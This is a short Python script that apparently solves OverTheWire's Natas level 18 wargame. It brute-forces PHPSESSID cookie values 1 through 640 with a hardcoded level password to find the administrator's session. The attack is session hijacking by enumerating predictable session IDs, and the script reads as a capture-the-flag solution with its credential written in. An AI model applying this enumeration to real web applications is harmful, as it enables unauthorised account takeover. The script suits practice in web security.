import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

MAX = 640
count = 1

url = "http://natas18.natas.labs.overthewire.org"

while count <= MAX:
    sessionID = "PHPSESSID=" + str(count)
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(url, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
